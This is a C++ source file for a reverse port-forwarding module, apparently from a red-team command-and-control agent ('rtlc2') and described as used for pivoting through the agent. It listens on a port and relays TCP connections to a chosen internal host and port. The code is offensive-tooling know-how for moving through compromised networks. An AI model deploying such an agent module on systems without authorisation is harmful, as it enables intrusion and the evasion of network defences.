// Reverse Port Forward Module
// Listens on a local port and relays connections to a remote host:port
// Used for pivoting through the agent

#include <string>
#include <map>
#include <mutex>
#include <thread>
#include <atomic>
#include <sstream>
#include <cstring>
#include <memory>
#include <vector>

#ifdef RTLC2_WINDOWS
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
typedef int socklen_t;
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/select.h>
#define SOCKET int
#define INVALID_SOCKET (-1)
#define SOCKET_ERROR (-1)
#define closesocket close
#endif

namespace rtlc2 {
namespace modules {

struct RPortFwdSession {
    int bind_port;
    std::string fwd_host;
    int fwd_port;
    SOCKET listen_sock;
    // Shared with detached relay threads so the flag outlives the session
    std::shared_ptr<std::atomic<bool>> running;
    std::thread listener_thread;

    RPortFwdSession() : bind_port(0), fwd_port(0), listen_sock(INVALID_SOCKET),
        running(std::make_shared<std::atomic<bool>>(false)) {}
};

static std::map<int, std::unique_ptr<RPortFwdSession>> g_forwards;
static std::mutex g_fwdMutex;

#ifdef RTLC2_WINDOWS
static bool g_wsaInitialized = false;
static void EnsureWSA() {
    if (!g_wsaInitialized) {
        WSADATA wsaData;
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        g_wsaInitialized = true;
    }
}
#else
static void EnsureWSA() {}
#endif

// Set socket to non-blocking mode
static void SetNonBlocking(SOCKET sock) {
#ifdef RTLC2_WINDOWS
    u_long mode = 1;
    ioctlsocket(sock, FIONBIO, &mode);
#else
    int flags = fcntl(sock, F_GETFL, 0);
    if (flags >= 0) {
        fcntl(sock, F_SETFL, flags | O_NONBLOCK);
    }
#endif
}

// Connect to the forward target
static SOCKET ConnectToTarget(const std::string& host, int port) {
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons((uint16_t)port);

    if (inet_pton(AF_INET, host.c_str(), &addr.sin_addr) <= 0) {
        return INVALID_SOCKET;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) return INVALID_SOCKET;

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        closesocket(sock);
        return INVALID_SOCKET;
    }

    return sock;
}

// Relay data bidirectionally between two sockets using select()
// Takes shared_ptr so the running flag outlives the session if needed
static void relay_data(SOCKET client, SOCKET remote, std::shared_ptr<std::atomic<bool>> running) {
    char buf[8192];
    SetNonBlocking(client);
    SetNonBlocking(remote);

    while (running->load()) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(client, &readfds);
        FD_SET(remote, &readfds);

        SOCKET maxfd = (client > remote) ? client : remote;

        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select((int)(maxfd + 1), &readfds, nullptr, nullptr, &tv);
        if (ret < 0) break;
        if (ret == 0) continue; // timeout, check running flag

        if (FD_ISSET(client, &readfds)) {
            int n = recv(client, buf, sizeof(buf), 0);
            if (n <= 0) break;
            int sent = 0;
            while (sent < n) {
                int s = send(remote, buf + sent, n - sent, 0);
                if (s <= 0) goto done;
                sent += s;
            }
        }

        if (FD_ISSET(remote, &readfds)) {
            int n = recv(remote, buf, sizeof(buf), 0);
            if (n <= 0) break;
            int sent = 0;
            while (sent < n) {
                int s = send(client, buf + sent, n - sent, 0);
                if (s <= 0) goto done;
                sent += s;
            }
        }
    }

done:
    closesocket(client);
    closesocket(remote);
}

// Listener loop: accept connections and relay to target
static void listener_loop(RPortFwdSession* session) {
    while (session->running->load()) {
        fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(session->listen_sock, &readfds);

        struct timeval tv;
        tv.tv_sec = 1;
        tv.tv_usec = 0;

        int ret = select((int)(session->listen_sock + 1), &readfds, nullptr, nullptr, &tv);
        if (ret < 0) break;
        if (ret == 0) continue; // timeout, check running flag

        if (FD_ISSET(session->listen_sock, &readfds)) {
            struct sockaddr_in client_addr;
            socklen_t addr_len = sizeof(client_addr);
            SOCKET client = accept(session->listen_sock, (struct sockaddr*)&client_addr, &addr_len);
            if (client == INVALID_SOCKET) continue;

            // Connect to forward target
            SOCKET remote = ConnectToTarget(session->fwd_host, session->fwd_port);
            if (remote == INVALID_SOCKET) {
                closesocket(client);
                continue;
            }

            // Spawn relay thread (detached); shared_ptr keeps running flag alive
            std::thread relay_thread(relay_data, client, remote, session->running);
            relay_thread.detach();
        }
    }

    // Cleanup listen socket
    if (session->listen_sock != INVALID_SOCKET) {
        closesocket(session->listen_sock);
        session->listen_sock = INVALID_SOCKET;
    }
}

std::string StartRPortFwd(int bind_port, const std::string& fwd_host, int fwd_port) {
    EnsureWSA();

    std::lock_guard<std::mutex> lock(g_fwdMutex);

    // Check if already running on this port
    if (g_forwards.count(bind_port)) {
        return "Error: reverse port forward already active on port " + std::to_string(bind_port);
    }

    // Create listen socket
    SOCKET listen_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_sock == INVALID_SOCKET) {
        return "Error: failed to create listen socket";
    }

    // Allow port reuse
    int opt = 1;
#ifdef RTLC2_WINDOWS
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));
#else
    setsockopt(listen_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
#endif

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = htonl(INADDR_ANY);
    addr.sin_port = htons((uint16_t)bind_port);

    if (bind(listen_sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        closesocket(listen_sock);
        return "Error: bind failed on port " + std::to_string(bind_port);
    }

    if (listen(listen_sock, 10) < 0) {
        closesocket(listen_sock);
        return "Error: listen failed on port " + std::to_string(bind_port);
    }

    // Create session
    auto session = std::make_unique<RPortFwdSession>();
    session->bind_port = bind_port;
    session->fwd_host = fwd_host;
    session->fwd_port = fwd_port;
    session->listen_sock = listen_sock;
    session->running->store(true);

    RPortFwdSession* sessionPtr = session.get();
    session->listener_thread = std::thread(listener_loop, sessionPtr);

    g_forwards[bind_port] = std::move(session);

    return "Reverse port forward started: 0.0.0.0:" + std::to_string(bind_port) +
           " -> " + fwd_host + ":" + std::to_string(fwd_port);
}

std::string StopRPortFwd(int bind_port) {
    std::lock_guard<std::mutex> lock(g_fwdMutex);

    auto it = g_forwards.find(bind_port);
    if (it == g_forwards.end()) {
        return "Error: no reverse port forward on port " + std::to_string(bind_port);
    }

    // Signal stop
    it->second->running->store(false);

    // Close listen socket to unblock accept
    if (it->second->listen_sock != INVALID_SOCKET) {
        closesocket(it->second->listen_sock);
        it->second->listen_sock = INVALID_SOCKET;
    }

    // Wait for listener thread to finish
    if (it->second->listener_thread.joinable()) {
        it->second->listener_thread.join();
    }

    g_forwards.erase(it);

    return "Reverse port forward stopped on port " + std::to_string(bind_port);
}

std::string ListRPortFwd() {
    std::lock_guard<std::mutex> lock(g_fwdMutex);

    if (g_forwards.empty()) {
        return "No active reverse port forwards";
    }

    std::ostringstream oss;
    oss << "Active reverse port forwards:\n";
    for (auto& kv : g_forwards) {
        oss << "  0.0.0.0:" << kv.second->bind_port
            << " -> " << kv.second->fwd_host << ":" << kv.second->fwd_port
            << " [" << (kv.second->running->load() ? "running" : "stopping") << "]\n";
    }
    return oss.str();
}

} // namespace modules
} // namespace rtlc2
